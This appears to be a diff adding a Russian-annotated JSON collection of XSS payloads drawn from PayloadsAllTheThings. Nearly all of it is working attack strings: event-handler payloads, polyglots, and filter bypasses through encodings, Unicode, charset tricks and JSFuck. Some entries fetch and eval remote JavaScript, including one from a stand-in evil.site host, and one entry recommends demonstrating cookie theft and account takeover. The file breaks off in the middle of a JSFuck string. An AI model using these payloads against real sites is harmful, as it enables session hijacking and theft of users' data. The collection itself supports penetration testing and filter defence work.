@@ -1,0 +1,790 @@
+{
+  "category": "XSS Injection",
+  "source": "PayloadsAllTheThings/XSS Injection/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Типы XSS",
+      "language": "text",
+      "tags": ["methodology", "xss"],
+      "body": "Reflected XSS — код прилетает в ссылке/параметре и исполняется в браузере жертвы при клике (не сохраняется на сервере).\nStored XSS — код сохраняется на сервере (комментарий, профиль) и исполняется у каждого, кто открывает страницу.\nDOM-based XSS — уязвимый JS меняет DOM на основе ввода; payload не уходит на сервер, исполняется прямо в браузере — сложнее детектить."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать XSS и как репортить",
+      "language": "text",
+      "tags": ["methodology", "recon", "poc"],
+      "body": "Любой ввод, который потом отрисовывается обратно пользователю: поиск, имя/профиль, комментарии, контактные формы, тикеты.\nЗаголовки Referer и User-Agent → часто оседают в логах админки и кастомной аналитике (благодатная почва для blind XSS).\nДля сильного PoC не ограничивайся alert(): показывай реальный импакт — кража cookie/токена, PII, перехват сессии, account takeover."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Не используй alert(1) — бери document.domain / origin",
+      "language": "html",
+      "tags": ["methodology", "poc"],
+      "body": "<script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script>"
+    },
+    {
+      "subcategory": "Методология",
+      "title": "console.log вместо alert для Stored XSS",
+      "language": "html",
+      "tags": ["methodology", "poc", "stored"],
+      "body": "<script>console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))</script>",
+      "meta": "alert() приходится закрывать на каждом срабатывании — для Stored XSS это мучительно; console.log пишет в консоль без интеракции."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Открыть отладчик вместо alert",
+      "language": "javascript",
+      "tags": ["methodology", "detection"],
+      "body": "<script>debugger;</script>",
+      "meta": "Открывает дебаггер в консоли разработчика вместо всплывающего alert."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Тулзы для детекта XSS",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "XSStrike — популярный, но слабо поддерживается.\nxsser — использует headless-браузер.\nDalfox — много функций, очень быстрый (Go).\nXSpear — аналог Dalfox на Ruby.\ndomdig — DOM XSS-тестер на headless Chrome.\nБольшинство тулз годятся и для blind XSS."
+    },
+
+    {
+      "subcategory": "Базовый HTML",
+      "title": "Базовые payload-ы (script)",
+      "language": "html",
+      "tags": ["basic", "script"],
+      "body": "<script>alert('XSS')</script>\n<scr<script>ipt>alert('XSS')</scr<script>ipt>\n\"><script>alert('XSS')</script>\n\"><script>alert(String.fromCharCode(88,83,83))</script>\n<script>\\u0061lert('22')</script>\n<script>eval('\\x61lert(\\'33\\')')</script>\n<script>eval(8680439..toString(30))(983801..toString(36))</script>\n<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\">",
+      "meta": "eval(8680439..toString(30)) == parseInt(\"confirm\",30); приём для обхода фильтра по имени функции."
+    },
+    {
+      "subcategory": "Базовый HTML",
+      "title": "img onerror",
+      "language": "html",
+      "tags": ["basic", "img", "onerror"],
+      "body": "<img src=x onerror=alert('XSS');>\n<img src=x onerror=alert('XSS')//\n<img src=x onerror=alert(String.fromCharCode(88,83,83));>\n<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>\n<img src=x:alert(alt) onerror=eval(src) alt=xss>\n\"><img src=x onerror=alert('XSS');>\n\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>\n<><img src=1 onerror=alert(1)>",
+      "meta": "oneonerrorrror — если фильтр вырезает строку \"onerror\" один раз, после вырезания остаётся валидный onerror."
+    },
+    {
+      "subcategory": "Базовый HTML",
+      "title": "svg onload",
+      "language": "html",
+      "tags": ["basic", "svg", "onload"],
+      "body": "<svgonload=alert(1)>\n<svg/onload=alert('XSS')>\n<svg onload=alert(1)//\n<svg/onload=alert(String.fromCharCode(88,83,83))>\n<svg id=alert(1) onload=eval(id)>\n\"><svg/onload=alert(String.fromCharCode(88,83,83))>\n\"><svg/onload=alert(/XSS/)\n<svg><script href=data:,alert(1) />\n<svg><script>alert('33')\n<svg><script>alert&lpar;'33'&rpar;",
+      "meta": "<script href=data:,alert(1) /> (самозакрывающийся script) работает только в Firefox."
+    },
+    {
+      "subcategory": "Базовый HTML",
+      "title": "div pointer-события",
+      "language": "html",
+      "tags": ["basic", "div", "events"],
+      "body": "<div onpointerover=\"alert(45)\">MOVE HERE</div>\n<div onpointerdown=\"alert(45)\">MOVE HERE</div>\n<div onpointerenter=\"alert(45)\">MOVE HERE</div>\n<div onpointerleave=\"alert(45)\">MOVE HERE</div>\n<div onpointermove=\"alert(45)\">MOVE HERE</div>\n<div onpointerout=\"alert(45)\">MOVE HERE</div>\n<div onpointerup=\"alert(45)\">MOVE HERE</div>"
+    },
+    {
+      "subcategory": "Базовый HTML",
+      "title": "HTML5-теги с автосрабатыванием",
+      "language": "html",
+      "tags": ["html5", "autofocus", "events"],
+      "body": "<body onload=alert(/XSS/.source)>\n<input autofocus onfocus=alert(1)>\n<select autofocus onfocus=alert(1)>\n<textarea autofocus onfocus=alert(1)>\n<keygen autofocus onfocus=alert(1)>\n<video/poster/onerror=alert(1)>\n<video><source onerror=\"javascript:alert(1)\">\n<video src=_ onloadstart=\"alert(1)\">\n<details/open/ontoggle=\"alert`1`\">\n<audio src onloadstart=alert(1)>\n<marquee onstart=alert(1)>\n<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>"
+    },
+    {
+      "subcategory": "Базовый HTML",
+      "title": "HTML5 touch-события (мобильные)",
+      "language": "html",
+      "tags": ["html5", "touch", "mobile"],
+      "body": "<body ontouchstart=alert(1)>\n<body ontouchend=alert(1)>\n<body ontouchmove=alert(1)>",
+      "meta": "ontouchstart — палец коснулся экрана; ontouchend — палец убран; ontouchmove — палец двигается по экрану."
+    },
+    {
+      "subcategory": "Базовый HTML",
+      "title": "Подгрузка удалённого JS",
+      "language": "html",
+      "tags": ["remote-js", "script"],
+      "body": "<svg/onload='fetch(\"//host/a\").then(r=>r.text().then(t=>eval(t)))'>\n<script src=14.rs>",
+      "meta": "14.rs — короткий хостинг JS; можно задать произвольный payload через 14.rs/#alert(document.domain)."
+    },
+    {
+      "subcategory": "Контекст: атрибут / hidden",
+      "title": "XSS в скрытом input (accesskey)",
+      "language": "html",
+      "tags": ["hidden", "accesskey", "attribute"],
+      "body": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">",
+      "meta": "Срабатывает по CTRL+SHIFT+X (комбинация accesskey)."
+    },
+    {
+      "subcategory": "Контекст: атрибут / hidden",
+      "title": "XSS в скрытом input (новые браузеры)",
+      "language": "html",
+      "tags": ["hidden", "attribute"],
+      "body": "<input type=\"hidden\" oncontentvisibilityautostatechange=\"alert(1)\"  style=\"content-visibility:auto\" >",
+      "meta": "Работает в новых браузерах: firefox-130 / chrome-108."
+    },
+    {
+      "subcategory": "Контекст: атрибут / hidden",
+      "title": "XSS в выводе в верхнем регистре (UPPERCASE)",
+      "language": "html",
+      "tags": ["uppercase", "html-entities", "bypass"],
+      "body": "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
+      "meta": "Если страница приводит ввод к UPPERCASE — HTML-сущности декодируются после преобразования регистра, так что alert остаётся в нижнем."
+    },
+    {
+      "subcategory": "Контекст: JS",
+      "title": "XSS в JS-контексте (без кавычек)",
+      "language": "javascript",
+      "tags": ["js-context", "no-quotes"],
+      "body": "-(confirm)(document.domain)//\n; alert(1);//",
+      "meta": "Payload без кавычек/двойных кавычек, от @brutelogic. Подходит когда ввод вставлен внутрь JS-строки/выражения."
+    },
+    {
+      "subcategory": "Контекст: JS",
+      "title": "Выход из JS-строки внутри <script>",
+      "language": "html",
+      "tags": ["js-context", "script-breakout"],
+      "body": "<script>\nfoo=\"text </script><script>alert(1)</script>\";\n</script>",
+      "meta": "Парсер HTML закрывает <script> по литералу </script> даже внутри JS-строки — этим разрываем строку и открываем новый скрипт."
+    },
+    {
+      "subcategory": "DOM-based",
+      "title": "DOM-based XSS (через DOM-sink)",
+      "language": "javascript",
+      "tags": ["dom", "sink"],
+      "body": "#\"><img src=/ onerror=alert(2)>",
+      "meta": "Через location.hash / другой DOM-источник, попадающий в опасный sink (innerHTML и т.п.)."
+    },
+
+    {
+      "subcategory": "URI-обёртки",
+      "title": "Wrapper javascript:",
+      "language": "javascript",
+      "tags": ["uri", "javascript-scheme"],
+      "body": "javascript:prompt(1)\n\n%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341\n\n&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41"
+    },
+    {
+      "subcategory": "URI-обёртки",
+      "title": "javascript: — Hex / Octal / Unicode кодирование",
+      "language": "javascript",
+      "tags": ["uri", "javascript-scheme", "encoding"],
+      "body": "\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)\n\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)\n\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)",
+      "meta": "Кодируем строку \"javascript:\" в Hex / Unicode / Octal."
+    },
+    {
+      "subcategory": "URI-обёртки",
+      "title": "javascript: — newline / tab / escape / комментарий",
+      "language": "javascript",
+      "tags": ["uri", "javascript-scheme", "bypass"],
+      "body": "java%0ascript:alert(1)\njava%09script:alert(1)\njava%0dscript:alert(1)\n\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)\njavascript://%0Aalert(1)\njavascript://anything%0D%0A%0D%0Awindow.alert(1)",
+      "meta": "%0a=LF, %09=tab, %0d=CR — символы переноса внутри \"java...script:\" игнорируются. Также экранирование \\j\\a... и приём \"// + перенос строки\"."
+    },
+    {
+      "subcategory": "URI-обёртки",
+      "title": "Как браузер парсит протокол javascript: (схема)",
+      "language": "image",
+      "tags": ["uri", "javascript-scheme", "dom"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/xss-injection/DwrkbH1VAAErOI2.jpg",
+        "caption": "Демо в консоли: a.href=\"javascript:alert()\"; a.protocol → \"javascript:\". Если вставить //:%0aalert() — a.protocol становится \":\". Иллюстрация, почему перенос строки и слэши ломают парсинг схемы. Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "URI-обёртки",
+      "title": "Wrapper data:",
+      "language": "html",
+      "tags": ["uri", "data-scheme"],
+      "body": "data:text/html,<script>alert(0)</script>\ndata:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+\n<script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>",
+      "meta": "base64 PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ = <svg/onload=alert(2)>; YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ== = alert(document.domain)."
+    },
+    {
+      "subcategory": "URI-обёртки",
+      "title": "Wrapper vbscript: (только IE)",
+      "language": "html",
+      "tags": ["uri", "vbscript", "ie"],
+      "body": "vbscript:msgbox(\"XSS\")"
+    },
+
+    {
+      "subcategory": "Полиглоты",
+      "title": "Полиглот 0xsobky (Ultimate XSS Polyglot)",
+      "language": "text",
+      "tags": ["polyglot", "famous"],
+      "body": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "meta": "Самый известный полиглот: работает в HTML, атрибутах, JS, в style/title/textarea/script-контекстах."
+    },
+    {
+      "subcategory": "Полиглоты",
+      "title": "Полиглот brutelogic",
+      "language": "text",
+      "tags": ["polyglot"],
+      "body": "JavaScript://%250Aalert?.(1)//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->"
+    },
+    {
+      "subcategory": "Полиглоты",
+      "title": "Полиглот Rsnake / Daniel Miessler",
+      "language": "text",
+      "tags": ["polyglot", "classic"],
+      "body": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
+    },
+    {
+      "subcategory": "Полиглоты",
+      "title": "Полиглот Ashar Javed",
+      "language": "text",
+      "tags": ["polyglot"],
+      "body": "\">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\">"
+    },
+    {
+      "subcategory": "Полиглоты",
+      "title": "Полиглот s0md3v (svg + confirm)",
+      "language": "text",
+      "tags": ["polyglot"],
+      "body": "-->'\"/></sCript><svG x=\">\" onload=(co\\u006efirm)``>"
+    },
+    {
+      "subcategory": "Полиглоты",
+      "title": "Полиглоты filedescriptor (Polyglot Challenge)",
+      "language": "text",
+      "tags": ["polyglot", "challenge"],
+      "body": "// Author: crlf\njavascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload=alert()//>\n\n// Author: europa\njavascript:\"/*'/*`/*\\\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>\n\n// Author: EdOverflow\njavascript:\"/*\\\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>\n\n// Author: h1/ragnar\njavascript:`//\"//\\\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`"
+    },
+
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход регистрозависимого фильтра",
+      "language": "html",
+      "tags": ["filter-bypass", "case"],
+      "body": "<sCrIpt>alert(1)</ScRipt>\n<ScrIPt>alert(1)</ScRipT>",
+      "meta": "Многие фильтры ловят только точный lowercase/uppercase-паттерн — микс регистра их обходит."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход чёрного списка тегов (вложенность)",
+      "language": "html",
+      "tags": ["filter-bypass", "tag-blacklist"],
+      "body": "<script x>\n<script x>alert('XSS')<script y>"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход чёрного списка слов через eval",
+      "language": "javascript",
+      "tags": ["filter-bypass", "eval", "word-blacklist"],
+      "body": "eval('ale'+'rt(0)');\nFunction(\"ale\"+\"rt(1)\")();\nnew Function`al\\ert\\`6\\``;\nsetTimeout('ale'+'rt(2)');\nsetInterval('ale'+'rt(10)');\nSet.constructor('ale'+'rt(13)')();\nSet.constructor`al\\x65rt\\x2814\\x29```;"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход незакрытым / неполным HTML-тегом",
+      "language": "html",
+      "tags": ["filter-bypass", "incomplete-tag"],
+      "body": "<img src='1' onerror='alert(0)' <",
+      "meta": "Работает в IE/Firefox/Chrome/Safari — браузер достраивает тег."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход без кавычек (String.fromCharCode)",
+      "language": "javascript",
+      "tags": ["filter-bypass", "no-quotes"],
+      "body": "String.fromCharCode(88,83,83)"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход фильтра точки (.)",
+      "language": "html",
+      "tags": ["filter-bypass", "dot"],
+      "body": "<script>window['alert'](document['domain'])</script>\n<script>eval(atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\"))<script>",
+      "meta": "Скобочная нотатция вместо точки. atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\") = alert(document.cookie). IP в десятичном виде: http://192.168.1.1 == http://3232235777."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход без скобок (string)",
+      "language": "javascript",
+      "tags": ["filter-bypass", "no-parenthesis"],
+      "body": "alert`1`\nsetTimeout`alert\\u0028document.domain\\u0029`;"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход без скобок и точки с запятой (throw onerror)",
+      "language": "html",
+      "tags": ["filter-bypass", "no-parenthesis"],
+      "body": "<script>onerror=alert;throw 1337</script>\n<script>{onerror=alert}throw 1337</script>\n<script>throw onerror=alert,'some string',123,'haha'</script>\n<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>\n<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>",
+      "meta": "От @garethheyes, @terjanq, @cgvwzq. onerror=alert + throw вызывает alert с аргументом-исключением."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход чёрного списка onxxxx=",
+      "language": "html",
+      "tags": ["filter-bypass", "event-handler"],
+      "body": "<object onafterscriptexecute=confirm(0)>\n<object onbeforescriptexecute=confirm(0)>\n<img src='1' onerror\\x00=alert(0) />\n<img src='1' onerror\\x0b=alert(0) />\n<img src='1' onerror\\x0d=alert(0) />\n<img src='1' onerror\\x0a=alert(0) />\n<img src='1' onerror/=alert(0) />",
+      "meta": "Малоизвестные обработчики on*scriptexecute; вставка null/vtab/CR/LF/'/' между onerror и '='."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход фильтра пробела",
+      "language": "html",
+      "tags": ["filter-bypass", "space"],
+      "body": "<img/src='1'/onerror=alert(0)>\n<svgonload=alert(1)>",
+      "meta": "Слэш вместо пробела; либо разделители 0x0c/0x0d/0x0a/0x09. Пример (0x0c между токенами): <svg^Lonload^L=^Lalert(1)^L> где ^L = 0x0c."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через Email-формат (RFC)",
+      "language": "html",
+      "tags": ["filter-bypass", "email", "rfc"],
+      "body": "\"><svg/onload=confirm(1)>\"@x.y\nxss@example.com(<img src='x' onerror='alert(document.location)'>)",
+      "meta": "Первый — RFC0822-валидный адрес; второй — RFC5322 (комментарий в скобках)."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через Tel URI (;phone-context=)",
+      "language": "html",
+      "tags": ["filter-bypass", "tel-uri", "rfc"],
+      "body": "+330011223344;phone-context=<script>alert(0)</script>",
+      "meta": "Дескриптор ;phone-context= упомянут в RFC3966 и RFC2806."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход чёрного списка document",
+      "language": "javascript",
+      "tags": ["filter-bypass", "document"],
+      "body": "<div id = \"x\"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>\nwindow[\"doc\"+\"ument\"]"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход чёрного списка document.cookie (cookieStore)",
+      "language": "javascript",
+      "tags": ["filter-bypass", "cookie"],
+      "body": "window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});",
+      "meta": "Доступ к cookie в Chrome/Edge/Opera через cookieStore API. Замени COOKIE NAME; есть и метод getAll()."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Альтернативные способы редиректа",
+      "language": "javascript",
+      "tags": ["filter-bypass", "redirect"],
+      "body": "location=\"http://google.com\"\ndocument.location = \"http://google.com\"\ndocument.location.href=\"http://google.com\"\nwindow.location.assign(\"http://google.com\")\nwindow['location']['href']=\"http://google.com\""
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Альтернативные способы вызвать alert",
+      "language": "javascript",
+      "tags": ["filter-bypass", "alert"],
+      "body": "window['alert'](0)\nparent['alert'](1)\nself['alert'](2)\ntop['alert'](3)\nthis['alert'](4)\nframes['alert'](5)\ncontent['alert'](6)\n\n[7].map(alert)\n[8].find(alert)\n[9].every(alert)\n[10].filter(alert)\n[11].findIndex(alert)\n[12].forEach(alert);",
+      "meta": "От @brutelogic — вызов alert через объект-носитель или через методы массива (callback)."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Альтернативный alert через constructor / global vars",
+      "language": "javascript",
+      "tags": ["filter-bypass", "alert", "constructor"],
+      "body": "constructor.constructor(\"aler\"+\"t(3)\")();\n[].filter.constructor('ale'+'rt(4)')();\ntop[\"al\"+\"ert\"](5);\ntop[8680439..toString(30)](7);\ntop[/al/.source+/ert/.source](8);\ntop['al\\x65rt'](9);\nopen('java'+'script:ale'+'rt(11)');\nlocation='javascript:ale'+'rt(12)';\nprompt`${document.domain}`\ndocument.location='java\\tscript:alert(1)'\ndocument.location='java\\rscript:alert(1)'",
+      "meta": "От @404death и @quanyang. Доступ к alert через индекс глобального объекта: self[Object.keys(self)[5]](\"1\")."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Не закрывать тег '>'",
+      "language": "html",
+      "tags": ["filter-bypass", "no-close"],
+      "body": "<svg onload=alert(1)//",
+      "meta": "Закрывать тег не обязательно — браузер сам достроит."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход '<' и '>' через ＜ ＞ (fullwidth)",
+      "language": "html",
+      "tags": ["filter-bypass", "unicode", "fullwidth"],
+      "body": "＜script/src=//evil.site/poc.js＞",
+      "meta": "Символы U+FF1C и U+FF1E. При нормализации/преобразовании заменяются на < и >."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход ';' другим символом-оператором",
+      "language": "javascript",
+      "tags": ["filter-bypass", "semicolon"],
+      "body": "'te' * alert('*') * 'xt';\n'te' / alert('/') / 'xt';\n'te' - alert('-') - 'xt';\n'te' + alert('+') + 'xt';\n'te' ^ alert('^') ^ 'xt';\n'te' > alert('>') > 'xt';\n'te' < alert('<') < 'xt';\n'te' == alert('==') == 'xt';\n'te' & alert('&') & 'xt';\n'te' , alert(',') , 'xt';\n'te' | alert('|') | 'xt';\n'te' ? alert('ifelsesh') : 'xt';\n'te' in alert('in') in 'xt';\n'te' instanceof alert('instanceof') instanceof 'xt';",
+      "meta": "Если ';' фильтруется — выражение разделяет любой бинарный оператор."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через HTML-сущности",
+      "language": "javascript",
+      "tags": ["filter-bypass", "html-entities", "encoding"],
+      "body": "%26%2397;lert(1)\n&#97;&#108;&#101;&#114;&#116;\n></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через ECMAScript6 (DiacriticalGrave)",
+      "language": "html",
+      "tags": ["filter-bypass", "es6"],
+      "body": "<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>",
+      "meta": "&DiacriticalGrave; декодируется в обратный апостроф ` → alert`1`."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через Octal-кодирование",
+      "language": "javascript",
+      "tags": ["filter-bypass", "octal", "encoding"],
+      "body": "javascript:'\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76'"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через Unicode escape",
+      "language": "html",
+      "tags": ["filter-bypass", "unicode", "encoding"],
+      "body": "<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>",
+      "meta": "\\u0061\\u006C\\u0065\\u0072\\u0074 = a l e r t. Идентификаторы JS можно записывать Unicode-эскейпами."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через Unicode-символы (fullwidth/modifier/case)",
+      "language": "text",
+      "tags": ["filter-bypass", "unicode"],
+      "body": "ʺ＞＜svg onload=alert(/XSS/)＞/\n%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/\n<ſvg onload=... >\n<ıframe id=x onload=>",
+      "meta": "\\uFF1C/\\uFF1E → </>; \\u02BA/\\u02B9 → \"/'. Символы ſ (U+017F) и ı (U+0131) после toUpperCase/toLowerCase превращаются в s/i и делают теги валидными."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через UTF-7",
+      "language": "text",
+      "tags": ["filter-bypass", "utf-7", "charset"],
+      "body": "+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через UTF-8 overlong / modifier",
+      "language": "text",
+      "tags": ["filter-bypass", "utf-8", "charset"],
+      "body": "< = %C0%BC = %E0%80%BC = %F0%80%80%BC\n> = %C0%BE = %E0%80%BE = %F0%80%80%BE\n' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7\n\" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2\n\" = %CA%BA\n' = %CA%B9"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через UTF-16be / UTF-32 / BOM",
+      "language": "text",
+      "tags": ["filter-bypass", "charset", "bom"],
+      "body": "UTF-16be:\n%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00\n\nUTF-16 BOM (Little Endian 0xFF 0xFE, страница должна начинаться с BOM):\n%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E",
+      "meta": "Требует отсутствия charset в Content-Type. BOM позволяет переопределить кодировку страницы; страница должна начинаться с BOM-символа."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через отсутствие charset (ISO-2022-JP)",
+      "language": "text",
+      "tags": ["filter-bypass", "charset", "iso-2022-jp"],
+      "body": "search=%1b(J&lang=en\";alert(1)//",
+      "meta": "Требование: в Content-Type нет charset (text/html). ISO-2022-JP: %1b(J переключает на JIS X 0201 1976, где 0x5c '\\' становится '¥', снимая экранирование кавычки \\' → ¥'."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через экзотические алфавиты (Katakana / Cuneiform / Lontara)",
+      "language": "javascript",
+      "tags": ["filter-bypass", "jsfuck", "obfuscation"],
+      "body": "// Katakana (aemkei/katakana.js)\njavascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()\n\n// Cuneiform\n𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],\n𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]\n+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]\n+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+\"(𒀀)\")()",
+      "meta": "Обфускация в стиле JSFuck алфавитами Katakana/Cuneiform/Lontara — обходит сигнатурные фильтры. Больше алфавитов: aem1k.com/aurebesh.js."
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обход через JSFuck",
+      "language": "javascript",
+      "tags": ["filter-bypass", "jsfuck", "obfuscation"],
+      "body": "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!!